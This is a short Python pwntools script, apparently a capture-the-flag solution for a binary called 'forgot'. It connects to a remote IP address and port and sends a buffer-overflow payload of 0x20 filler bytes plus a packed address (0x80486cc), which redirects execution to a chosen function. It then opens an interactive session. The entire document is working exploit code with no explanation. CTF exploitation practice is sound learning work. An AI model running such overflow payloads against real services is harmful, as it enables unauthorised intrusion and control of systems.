from pwn import  *
#p=process("./forgot")
p = remote("61.147.171.105",64670)
payload = b'A'*0x20 + p32(0x80486cc)
p.sendlineafter(">","hhh")
p.sendlineafter(">",payload)
p.interactive()
